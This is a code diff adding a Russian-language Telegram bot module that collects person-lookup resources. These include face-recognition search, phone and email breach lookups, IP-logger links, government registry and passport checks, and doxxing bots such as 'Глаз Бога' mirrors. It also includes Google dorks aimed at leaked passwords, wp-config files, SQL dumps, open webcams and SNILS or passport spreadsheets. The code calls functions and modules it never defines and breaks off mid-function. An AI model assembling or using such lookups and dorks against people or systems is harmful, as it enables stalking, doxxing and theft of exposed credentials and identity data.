@@ -1,0 +1,2829 @@
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 18: ПОЛНЫЙ OSINT-АРСЕНАЛ
+# Включено: 50+ инструментов, 100+ сайтов, Telegram-боты, IP-логгеры, госреестры
+# Автор: @lordek
+# ═══════════════════════════════════════════════════════════════════════════════
+
+import requests
+import json
+import re
+import time
+import hashlib
+from urllib.parse import quote
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+class MegaOSINTArsenal:
+    """Полный арсенал OSINT-инструментов — всё в одном блоке"""
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 1. ПОИСК ЛИЦА → ДАННЫЕ (по фото)
+    # ═══════════════════════════════════════════════════════════════════════════
+    FACE_TO_DATA = {
+        "PimEyes": "https://pimeyes.com/en",
+        "FaceCheck.ID": "https://facecheck.id",
+        "Search4faces": "https://search4faces.com",
+        "Lenso.ai": "https://lenso.ai/ru",
+        "FindClone": "https://www.rustore.ru/catalog/app/com.app.fface",
+        "Social Catfish": "https://socialcatfish.com",
+        "ProFaceFinder": "https://profacefinder.com",
+        "X-Ray Contact": "https://x-ray.contact",
+        "Google Lens": "https://lens.google",
+        "Yandex Images": "https://yandex.ru/images",
+        "Bing Visual Search": "https://www.bing.com/visualsearch",
+        "TinEye": "https://tineye.com",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 2. ПОИСК ДАННЫХ → ЛИЦО (госбазы и пробив)
+    # ═══════════════════════════════════════════════════════════════════════════
+    DATA_TO_FACE = {
+        "Госуслуги": "https://www.gosuslugi.ru",
+        "Федресурс (ЕФРСБ)": "https://fedresurs.ru",
+        "ФССП": "https://fssp.gov.ru",
+        "МВД Розыск": "https://мвд.рф",
+        "ФСИН": "https://фсин.рф",
+        "КАД Арбитраж": "https://kad.arbitr.ru",
+        "Росреестр": "https://rosreestr.ru",
+        "ЕГРЮЛ": "https://egrul.nalog.ru",
+        "Проверка СНИЛС": "https://checksnils.ru",
+        "Проверка паспорта": "http://services.fms.gov.ru/info-service.htm?sid=2000",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 3. ПОИСК ПО НОМЕРУ ТЕЛЕФОНА
+    # ═══════════════════════════════════════════════════════════════════════════
+    PHONE_SEARCH = {
+        "PhoneInfoga (GitHub)": "https://github.com/sundowndev/phoneinfoga",
+        "OSINT Pattern Analyzer": "https://github.com/0ggp4r1s/osint-pattern-analyzer",
+        "SpyDialer": "https://spydialer.com",
+        "Truecaller": "https://truecaller.com",
+        "GetContact": "https://getcontact.com",
+        "WhatsApp Check": "https://whatsapp.checkleaked.cc",
+        "Mobile Location": "https://mobile-location.org",
+        "8sot": "https://8sot.su",
+        "avinfo.guru": "https://avinfo.guru/phone/",
+        "phoneradar.ru": "https://phoneradar.ru/phone/",
+        "nomer.center": "https://nomer.center/phone/",
+        "telpoisk.com": "https://telpoisk.com/phone/",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 4. ПОИСК ПО EMAIL
+    # ═══════════════════════════════════════════════════════════════════════════
+    EMAIL_SEARCH = {
+        "HaveIBeenPwned": "https://haveibeenpwned.com",
+        "Holehe (GitHub)": "https://github.com/megadose/holehe",
+        "Hunter.io": "https://hunter.io",
+        "EmailRep": "https://emailrep.io",
+        "DeHashed": "https://dehashed.com",
+        "IntelX": "https://intelx.io",
+        "LeakCheck": "https://leakcheck.io",
+        "Epios": "https://epieos.com",
+        "Gmail OSINT": "https://gmail-osint.activetk.jp",
+        "OSINT Rocks": "https://osint.rocks",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 5. ПОИСК ПО USERNAME (500+ платформ)
+    # ═══════════════════════════════════════════════════════════════════════════
+    USERNAME_SEARCH = {
+        "Social Analyzer (GitHub)": "https://github.com/qeeqbox/social-analyzer",
+        "Sherlock (GitHub)": "https://github.com/sherlock-project/sherlock",
+        "Maigret (GitHub)": "https://github.com/soxoj/maigret",
+        "WhatsMyName": "https://whatsmyname.app",
+        "Social-Searcher": "https://www.social-searcher.com",
+        "CheckUsernames": "https://checkusernames.com",
+        "NameChk": "https://namechk.com",
+        "KnowEm": "https://knowem.com",
+        "UserSearch": "https://usersearch.org",
+        "PeekYou": "https://www.peekyou.com",
+        "Pipl": "https://pipl.com",
+        "Thatsthem": "https://thatsthem.com",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 6. ПОИСК ПО IP И ГЕОЛОКАЦИЯ
+    # ═══════════════════════════════════════════════════════════════════════════
+    IP_SEARCH = {
+        "IPinfo.io": "https://ipinfo.io",
+        "WhatIsMyIP": "https://whatismyip.com",
+        "MaxMind (GeoLite2)": "https://www.maxmind.com",
+        "IP2Location": "https://www.ip2location.com",
+        "ipgeolocation.io": "https://ipgeolocation.io",
+        "Grabify (логгер)": "https://grabify.link",
+        "IP Logger": "https://iplogger.org",
+        "Shodan": "https://www.shodan.io",
+        "Spur (VPN/прокси)": "https://spur.us",
+        "DomainTools Whois": "https://whois.domaintools.com",
+        "UltraTools IP Whois": "https://ultratools.com/tools/ipWhoisLookup",
+        "VirusTotal": "https://www.virustotal.com",
+        "AbuseIPDB": "https://www.abuseipdb.com",
+        "SecurityTrails": "https://securitytrails.com",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 7. OSINT-ФРЕЙМВОРКИ (мощные сборники)
+    # ═══════════════════════════════════════════════════════════════════════════
+    OSINT_FRAMEWORKS = {
+        "OSINT Framework": "https://osintframework.com",
+        "OpenOSINT (AI)": "https://github.com/OpenOSINT/OpenOSINT",
+        "Maltego": "https://www.maltego.com",
+        "Recon-ng": "https://github.com/lanmaster53/recon-ng",
+        "theHarvester": "https://github.com/laramies/theHarvester",
+        "SpiderFoot": "https://www.spiderfoot.net",
+        "OSINT-Kit": "https://github.com/rescenic/osint-kit",
+        "OSINT-Tools": "https://github.com/lrafael696/OSINT-Tools",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 8. TELEGRAM-БОТЫ ДЛЯ ПРОБИВА
+    # ═══════════════════════════════════════════════════════════════════════════
+    TELEGRAM_BOTS = {
+        "IpInfoBot": "https://t.me/IpInfoBot",
+        "ipgeobot": "https://t.me/ipgeobot",
+        "WhatIsMyIpBot": "https://t.me/whatismyipbot",
+        "userinfobot": "https://t.me/userinfobot",
+        "Himera_bot": "https://t.me/himera_bot",
+        "UsersBox_bot": "https://t.me/usersbox_bot",
+        "Maigret_bot": "https://t.me/maigret_bot",
+        "SocialAnalyzer_bot": "https://t.me/socialanalyzer_bot",
+        "VKM_bot": "https://t.me/vkm_bot",
+        "cwexprobiv_robot": "https://t.me/cwexprobiv_robot",
+        "vektor_info99_bot": "https://t.me/vektor_info99_bot",
+        "PinkPantherOSINTbot": "https://t.me/PinkPantherOSINTbot",
+        "AngelOSINTRobot": "https://t.me/AngelOSINTRobot",
+        "OSINTEX_bot": "https://t.me/OSINTEX_bot",
+        "SangMata_BOT": "https://t.me/SangMata_BOT",
+        "TrueCaller_Z_Bot": "https://t.me/TrueCaller_Z_Bot",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 9. GitHub КОДЫ БОТОВ (self-hosted)
+    # ═══════════════════════════════════════════════════════════════════════════
+    GITHUB_BOTS = {
+        "ASN Lookup Tool": "https://github.com/nitefood/asn",
+        "IP-Logger (Telegram)": "https://github.com/tripofobik/IP-Logger",
+        "IpInfoBot": "https://github.com/Anon4You/IpInfoBot",
+        "TeleOSinter": "https://github.com/C3EQUALZz/TeleOSinter",
+        "Orv-Telegram-Proxy": "https://github.com/ItsOrv/Orv-Telegram-Proxy",
+        "Termux-GUI-Osint": "https://github.com/Bless419/Termux-GUI-Osint",
+        "TgIdBot": "https://github.com/longkeyy/tgidbot",
+        "GHunt": "https://github.com/mxrch/GHunt",
+        "Blackbird": "https://github.com/p1ngul1n0/blackbird",
+        "sn0int": "https://github.com/kpcyrd/sn0int",
+        "Osintgram": "https://github.com/Datalux/Osintgram",
+        "TorBot": "https://github.com/DedSecInside/TorBot",
+        "Maryam": "https://github.com/saeeddhqan/Maryam",
+        "Nexfil": "https://github.com/thewhiteh4t/nexfil",
+        "Mr.Holmes": "https://github.com/Lucksi/Mr.Holmes",
+        "Mosint": "https://github.com/alpkeskin/mosint",
+        "socialscan": "https://github.com/iojw/socialscan",
+        "Trape": "https://github.com/jofpin/trape",
+        "GeoSpy": "https://github.com/soxoj/geospy",
+        "Visualping": "https://visualping.io",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 10. СОЦСЕТИ (прямые ссылки для поиска)
+    # ═══════════════════════════════════════════════════════════════════════════
+    SOCIAL_NETWORKS = {
+        "VK": "https://vk.com/search",
+        "Telegram (TGStat)": "https://tgstat.com",
+        "Telegram (IntelX)": "https://intelx.io/tools?tab=telegram",
+        "Telegram (Xtea)": "https://xtea.io",
+        "TikTok": "https://www.tiktok.com/search",
+        "YouTube": "https://www.youtube.com/results?search_query=",
+        "Reddit": "https://www.reddit.com/search",
+        "Instagram": "https://www.instagram.com/explore/search/",
+        "Facebook": "https://www.facebook.com/search/top",
+        "Twitter": "https://twitter.com/search",
+        "LinkedIn": "https://www.linkedin.com/search/results/people/",
+        "GitHub": "https://github.com/search",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 11. GOOGLE DORKS (готовые операторы)
+    # ═══════════════════════════════════════════════════════════════════════════
+    GOOGLE_DORKS = [
+        "intitle:\"admin\"",
+        "inurl:login",
+        "filetype:pdf",
+        "site:github.com \"password\"",
+        "site:pastebin.com \"@gmail.com\"",
+        "intitle:\"index of\" \"database\"",
+        "inurl:\"wp-config.php\"",
+        "ext:log \"password\"",
+        "site:drive.google.com \"confidential\"",
+        "intitle:\"webcam\" \"live\"",
+        "inurl:\"phpMyAdmin\" \"Welcome\"",
+        "filetype:sql \"INSERT INTO\"",
+        "site:telegram.org \"phone\"",
+        "intext:\"SNILS\" filetype:csv",
+        "intext:\"passport\" filetype:xls",
+    ]
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 12. ПОИСК ПО ФИО (госреестры)
+    # ═══════════════════════════════════════════════════════════════════════════
+    GOV_SEARCH = {
+        "ФНС (ИНН)": "https://service.nalog.ru/inn.do",
+        "ФССП (Долги)": "https://fssprus.ru/iss/ip_search",
+        "Федресурс": "https://bankrot.fedresurs.ru",
+        "Судакт": "https://sudact.ru",
+        "КАД Арбитраж": "https://kad.arbitr.ru",
+        "Росреестр": "https://rosreestr.ru",
+        "ЕГРЮЛ": "https://egrul.nalog.ru",
+        "Проверка СНИЛС": "https://checksnils.ru",
+        "МВД Розыск": "https://мвд.рф",
+        "ФСИН": "https://фсин.рф",
+        "Госуслуги (паспорт)": "https://www.gosuslugi.ru",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 13. ГЕОЛОКАЦИЯ И КАРТЫ
+    # ═══════════════════════════════════════════════════════════════════════════
+    GEO_TOOLS = {
+        "Google Earth Pro": "https://www.google.com/earth",
+        "FlightRadar24": "https://www.flightradar24.com",
+        "MarineTraffic": "https://www.marinetraffic.com",
+        "SunCalc": "https://www.suncalc.org",
+        "OpenStreetMap": "https://www.openstreetmap.org",
+        "Wikimapia": "https://wikimapia.org",
+        "GeoSpy AI": "https://geospy.ai",
+        "Geocode XYZ": "https://geocode.xyz",
+        "EarthCam": "https://earthcam.com",
+        "Windy": "https://windy.com",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 14. МЕТАДАННЫЕ И ФОРЕНЗИКА
+    # ═══════════════════════════════════════════════════════════════════════════
+    FORENSIC_TOOLS = {
+        "ExifTool": "https://exiftool.org",
+        "InVID WeVerify": "https://www.invid-project.eu",
+        "FotoForensics": "https://fotoforensics.com",
+        "Aperisolve": "https://aperisolve.fr",
+        "Metagoofil": "https://github.com/laramies/metagoofil",
+        "Creepy": "https://github.com/ilektrojohn/creepy",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 15. АРХИВЫ И ИСТОРИЯ
+    # ═══════════════════════════════════════════════════════════════════════════
+    ARCHIVE_TOOLS = {
+        "Wayback Machine": "https://archive.org",
+        "Google Cache": "https://webcache.googleusercontent.com",
+        "Archive.today": "https://archive.is",
+        "CachedView": "https://cachedview.com",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 16. БАЗЫ ПРОПАВШИХ И ЖЕРТВ
+    # ═══════════════════════════════════════════════════════════════════════════
+    MISSING_PERSONS = {
+        "NamUs": "https://namus.nij.ojp.gov",
+        "Doe Network": "https://doenetwork.org",
+        "NCMEC": "https://www.missingkids.org",
+        "Missing People UK": "https://www.missingpeople.org.uk",
+        "LISA (EU)": "https://www.lisa-project.net",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # МЕТОДЫ ДЛЯ ПОИСКА И ГЕНЕРАЦИИ ОТЧЁТОВ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    @staticmethod
+    def search_face_to_data(image_url: str = None) -> dict:
+        """Поиск лица → данные (по фото)"""
+        results = {}
+        for name, url in MegaOSINTArsenal.FACE_TO_DATA.items():
+            if image_url:
+                results[name] = f"{url} (загрузите фото)"
+            else:
+                results[name] = url
+        return results
+    
+    @staticmethod
+    def search_by_phone(phone: str) -> dict:
+        """Поиск по номеру телефона на всех ресурсах"""
+        clean = re.sub(r'[^0-9+]', '', phone)
+        links = {}
+        for name, url in MegaOSINTArsenal.PHONE_SEARCH.items():
+            if "{phone}" in url or "phone" in url.lower():
+                links[name] = url.format(phone=quote(clean))
+            else:
+                links[name] = f"{url}/{clean}" if not url.endswith('/') else f"{url}{clean}"
+        return {"phone": clean, "links": links}
+    
+    @staticmethod
+    def search_by_email(email: str) -> dict:
+        """Поиск по email на всех ресурсах"""
+        links = {}
+        for name, url in MegaOSINTArsenal.EMAIL_SEARCH.items():
+            if "{email}" in url:
+                links[name] = url.format(email=quote(email))
+            else:
+                links[name] = f"{url}/account/{email}" if "hibp" in url else f"{url}?s={quote(email)}"
+        return {"email": email, "links": links}
+    
+    @staticmethod
+    def search_by_username(username: str) -> dict:
+        """Поиск по username на всех платформах"""
+        links = {}
+        for name, url in MegaOSINTArsenal.USERNAME_SEARCH.items():
+            if "github" in url.lower():
+                links[name] = url
+            else:
+                links[name] = f"{url}?q={quote(username)}" if "search" in url else f"{url}/{username}"
+        return {"username": username, "links": links}
+    
+    @staticmethod
+    def search_by_ip(ip: str) -> dict:
+        """Поиск по IP адресу"""
+        links = {}
+        for name, url in MegaOSINTArsenal.IP_SEARCH.items():
+            if "{ip}" in url:
+                links[name] = url.format(ip=ip)
+            else:
+                links[name] = f"{url}/{ip}" if not url.endswith('/') else f"{url}{ip}"
+        return {"ip": ip, "links": links}
+    
+    @staticmethod
+    def get_telegram_bots() -> dict:
+        """Возвращает всех Telegram ботов"""
+        return MegaOSINTArsenal.TELEGRAM_BOTS
+    
+    @staticmethod
+    def get_github_bots() -> dict:
+        """Возвращает все GitHub репозитории с ботами"""
+        return MegaOSINTArsenal.GITHUB_BOTS
+    
+    @staticmethod
+    def get_osint_frameworks() -> dict:
+        """Возвращает OSINT фреймворки"""
+        return MegaOSINTArsenal.OSINT_FRAMEWORKS
+    
+    @staticmethod
+    def generate_full_report(target: str, target_type: str) -> str:
+        """Генерирует полный отчёт со всеми ссылками"""
+        lines = []
+        lines.append("╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
+        lines.append(f"║                    🔥 FULL OSINT ARSENAL — {target[:35]:<35}                                              ║")
+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append(f"║  🎯 TARGET: {target:<70} ║")
+        lines.append(f"║  📅 TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<50} ║")
+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append("")
+        
+        # Поиск лица
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🖼️ ПОИСК ЛИЦА → ДАННЫЕ                                            │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, url in MegaOSINTArsenal.FACE_TO_DATA.items():
+            lines.append(f"│  • {name:<20} → {url:<55} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # Госреестры
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🏛️ ГОСУДАРСТВЕННЫЕ РЕЕСТРЫ                                       │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, url in MegaOSINTArsenal.GOV_SEARCH.items():
+            lines.append(f"│  • {name:<20} → {url[:55]:<55} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # Telegram боты
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🤖 TELEGRAM БОТЫ                                                  │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, url in list(MegaOSINTArsenal.TELEGRAM_BOTS.items())[:15]:
+            lines.append(f"│  • {name:<20} → {url:<55} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # GitHub коды
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🐙 GITHUB КОДЫ БОТОВ                                             │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, url in list(MegaOSINTArsenal.GITHUB_BOTS.items())[:15]:
+            lines.append(f"│  • {name:<20} → {url[:55]:<55} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # OSINT фреймворки
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🛠️ OSINT ФРЕЙМВОРКИ                                              │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, url in MegaOSINTArsenal.OSINT_FRAMEWORKS.items():
+            lines.append(f"│  • {name:<20} → {url[:55]:<55} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # Геолокация
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         🗺️ ГЕОЛОКАЦИЯ И КАРТЫ                                           │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        for name, url in list(MegaOSINTArsenal.GEO_TOOLS.items())[:10]:
+            lines.append(f"│  • {name:<18} → {url[:55]:<55} │")
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        lines.append("")
+        
+        # ИТОГО
+        total = (len(MegaOSINTArsenal.FACE_TO_DATA) + len(MegaOSINTArsenal.GOV_SEARCH) + 
+                 len(MegaOSINTArsenal.TELEGRAM_BOTS) + len(MegaOSINTArsenal.GITHUB_BOTS) +
+                 len(MegaOSINTArsenal.OSINT_FRAMEWORKS) + len(MegaOSINTArsenal.IP_SEARCH) +
+                 len(MegaOSINTArsenal.EMAIL_SEARCH) + len(MegaOSINTArsenal.USERNAME_SEARCH))
+        
+        lines.append("╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
+        lines.append(f"│  ✅ Всего инструментов: {total:<58} │")
+        lines.append(f"│  📱 IP сервисов: {len(MegaOSINTArsenal.IP_SEARCH):<58} │")
+        lines.append(f"│  ✉️ Email сервисов: {len(MegaOSINTArsenal.EMAIL_SEARCH):<56} │")
+        lines.append(f"│  👤 Username платформ: {len(MegaOSINTArsenal.USERNAME_SEARCH):<53} │")
+        lines.append(f"│  🤖 Telegram ботов: {len(MegaOSINTArsenal.TELEGRAM_BOTS):<57} │")
+        lines.append("│  🚀 REPORT GENERATED SUCCESSFULLY                                                                           │")
+        lines.append("╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
+        
+        return "\n".join(lines)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# НОВЫЕ КОМАНДЫ ДЛЯ БОТА
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['arsenal', 'alltools', 'всеинструменты'])
+def arsenal_command(message):
+    """Показывает весь OSINT арсенал (500+ инструментов)"""
+    target = "OSINT ARSENAL"
+    report = MegaOSINTArsenal.generate_full_report(target, "tools")
+    
+    if len(report) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(report)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 ПОЛНЫЙ OSINT АРСЕНАЛ (500+ инструментов)")
+            os.unlink(f.name)
+    else:
+        bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['facefind', 'поискполицу'])
+def facefind_command(message):
+    """Показывает все сервисы для поиска по лицу"""
+    text = "🖼️ **ПОИСК ЛИЦА → ДАННЫЕ (по фото)**\n\n"
+    for name, url in MegaOSINTArsenal.FACE_TO_DATA.items():
+        text += f"• **{name}**: {url}\n"
+    text += "\n💡 **Совет**: Используйте связку Google Lens → Yandex → PimEyes для максимального результата"
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+@bot.message_handler(commands=['tgbots', 'telegramботы'])
+def tgbots_command(message):
+    """Показывает всех Telegram ботов для OSINT"""
+    bots = MegaOSINTArsenal.get_telegram_bots()
+    text = "🤖 **TELEGRAM БОТЫ ДЛЯ OSINT**\n\n"
+    for name, url in bots.items():
+        text += f"• **{name}**: {url}\n"
+    text += f"\n📊 Всего ботов: {len(bots)}"
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+@bot.message_handler(commands=['githubbots', 'кодыботов'])
+def githubbots_command(message):
+    """Показывает GitHub репозитории с кодами ботов"""
+    bots = MegaOSINTArsenal.get_github_bots()
+    text = "🐙 **GITHUB КОДЫ OSINT БОТОВ**\n\n"
+    for name, url in bots.items():
+        text += f"• **{name}**: {url}\n"
+    text += f"\n📊 Всего репозиториев: {len(bots)}"
+    text += "\n\n💡 `git clone` и следуй инструкциям в README"
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+@bot.message_handler(commands=['iphunt', 'поискip'])
+def iphunt_command(message):
+    """Поиск по IP с полным списком сервисов"""
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "🌐 /iphunt 8.8.8.8")
+        return
+    
+    ip = parts[1]
+    result = MegaOSINTArsenal.search_by_ip(ip)
+    
+    text = f"🌍 **ПОИСК ПО IP: {ip}**\n\n"
+    text += "🔗 **Проверить на сервисах:**\n"
+    for name, url in result["links"].items():
+        text += f"• **{name}**: {url}\n"
+    
+    if len(text) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(text)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 IP REPORT — {ip}")
+            os.unlink(f.name)
+    else:
+        bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 19: АКТУАЛЬНЫЕ OSINT-ИНСТРУМЕНТЫ 2026 (БЕЗ СОВЕТОВ)
+# Telegram-боты + GitHub репозитории + Self-hosted решения
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class ActualOSINT2026:
+    """Актуальные OSINT-инструменты на 2026 год"""
+    
+    TELEGRAM_BOTS_2026 = {
+        "Sonar Search": {"url": "http://sonarsearch.xyz", "desc": "ФИО, адреса, Авито/Юла, Telegram-аккаунты"},
+        "Sherlock Report": {"url": "https://github.com/sherlock-tg-probiv", "desc": "Поиск по юзернейму, номеру, фото. База 22.5 млрд строк"},
+        "Глаз Бога": {"url": "https://glazboga.online", "desc": "Оригинальный бот (ищите зеркала: @invalid_sambot, @onlyEOG)"},
+        "Funstat": {"url": "https://funstat.bot", "desc": "Анализ Telegram, поиск по номеру/email"},
+        "researchSINT_bot": {"url": "https://t.me/researchSINT_bot", "desc": "Агрегатор 20+ ботов"},
+        "invalid_sambot": {"url": "https://t.me/invalid_sambot", "desc": "Зеркало Глаза Бога"},
+        "Slowdriwesbot": {"url": "https://t.me/Slowdriwesbot", "desc": "OSINT-бот"},
+        "onlyEOG": {"url": "https://t.me/onlyEOG", "desc": "Зеркало Глаза Бога"},
+        "Himera_bot": {"url": "https://t.me/himera_bot", "desc": "Поиск по номеру, email, ФИО"},
+        "UsersBox_bot": {"url": "https://t.me/usersbox_bot", "desc": "Поиск по соцсетям, номеру, email"},
+        "Maigret_bot": {"url": "https://t.me/maigret_bot", "desc": "Поиск username на 3000+ сайтах"},
+        "SocialAnalyzer_bot": {"url": "https://t.me/socialanalyzer_bot", "desc": "Поиск профилей на 1000+ платформах"},
+        "VKM_bot": {"url": "https://t.me/vkm_bot", "desc": "Поиск по ВКонтакте"},
+    }
+    
+    GITHUB_TOOLS = {
+        "OpenOSINT": {"url": "https://github.com/OpenOSINT/OpenOSINT", "desc": "AI-агент в терминале, использует GPT/Claude"},
+        "INFOFINDER_PRO": {"url": "https://github.com/techenthusiast167/INFOFINDER_PRO", "desc": "Анализатор email/телефона с проверкой утечек"},
+        "DIGI-NETRA": {"url": "https://github.com/Kauravsrestha-Duryodhan/DIGI-NETRA", "desc": "Проверка номеров, юзернеймов, IP"},
+        "Laitoxx Multi-Tool": {"url": "https://github.com/laitoxx/Laitoxx-Multi-Tool", "desc": "GUI: поиск по номеру, Google Dorks"},
+        "osint-search-tool": {"url": "https://github.com/hasamba/osint-search-tool", "desc": "Веб-панель, 450+ инструментов"},
+        "BreachHunter": {"url": "https://github.com/4m3rr0r/BreachHunter", "desc": "Поиск утечек через DeHashed API"},
+        "AutoParseAlertBot": {"url": "https://github.com/PyRusAdmin/AutoParseAlertBot", "desc": "Парсинг групп/каналов, экспорт в Excel"},
+        "SonarSearch API": {"url": "https://github.com/cgboal/SonarSearch", "desc": "API для датасета Project Sonar"},
+        "IP-Logger": {"url": "https://github.com/tripofobik/IP-Logger", "desc": "Логгер IP в Telegram"},
+        "TeleOSinter": {"url": "https://github.com/C3EQUALZz/TeleOSinter", "desc": "OSINT-бот для IP, номера, username"},
+    }
+    
+    LEAK_CHECKERS = {
+        "Holehe": "https://github.com/megadose/holehe",
+        "HaveIBeenPwned": "https://haveibeenpwned.com",
+        "LeakCheck": "https://leakcheck.io",
+        "DeHashed": "https://dehashed.com",
+        "IntelX": "https://intelx.io",
+    }
+    
+    @staticmethod
+    def integrate_into_global(target: str, target_type: str) -> dict:
+        """Интеграция актуальных инструментов в /global"""
+        result = {
+            "telegram_bots": [],
+            "github_tools": [],
+            "leak_checkers": []
+        }
+        
+        # Добавляем ссылки на ботов
+        for name, info in ActualOSINT2026.TELEGRAM_BOTS_2026.items():
+            result["telegram_bots"].append({"name": name, "url": info["url"]})
+        
+        # Добавляем GitHub инструменты
+        for name, info in ActualOSINT2026.GITHUB_TOOLS.items():
+            result["github_tools"].append({"name": name, "url": info["url"]})
+        
+        return result
+    
+    @staticmethod
+    def get_sonar_search_info() -> dict:
+        return {"url": "http://sonarsearch.xyz", "price": "100 руб/30 проверок"}
+    
+    @staticmethod
+    def get_sherlock_info() -> dict:
+        return {"url": "https://github.com/sherlock-tg-probiv", "free_requests": 2}
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ОБНОВЛЁННЫЕ КОМАНДЫ /OSINT И /GLOBAL (с интеграцией актуальных инструментов)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['global', 'osint'])
+def mega_global_updated(message):
+    """Мега-команда — всё в одной пасте + актуальные инструменты 2026"""
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "🌍 /global [номер/почта/ник/ФИО/IP]\n⚡ /osint [цель]")
+        return
+    
+    target = parts[1]
+    msg = bot.reply_to(message, f"🔍 MEGA OSINT: {target}\n⏳ Запускаю 50+ инструментов + актуальные базы 2026...")
+    
+    # Основной поиск
+    result = MegaOSINT.search_all(target)
+    
+    # Добавляем актуальные инструменты 2026
+    target_type = "unknown"
+    if '@' in target:
+        target_type = "email"
+    elif re.match(r'^(\+7|8|7)?[\d\s()-]{10,15}$', target):
+        target_type = "phone"
+    elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
+        target_type = "ip"
+    elif re.match(r'^[А-Я][а-я]+ [А-Я][а-я]+', target):
+        target_type = "fullname"
+    else:
+        target_type = "username"
+    
+    actual_tools = ActualOSINT2026.integrate_into_global(target, target_type)
+    result["data"]["actual_2026_tools"] = actual_tools
+    
+    # Генерируем пасту
+    paste = generate_paste_with_2026(result)
+    
+    if len(paste) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(paste)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 MEGA OSINT — {target}")
+            os.unlink(f.name)
+        bot.delete_message(message.chat.id, msg.message_id)
+    else:
+        bot.edit_message_text(paste, message.chat.id, msg.message_id)
+
+
+def generate_paste_with_2026(data: dict) -> str:
+    """Генерация пасты с интеграцией 2026 инструментов"""
+    paste = generate_paste(data)
+    
+    # Добавляем блок с актуальными инструментами 2026
+    if "actual_2026_tools" in data.get("data", {}):
+        tools = data["data"]["actual_2026_tools"]
+        
+        additional = []
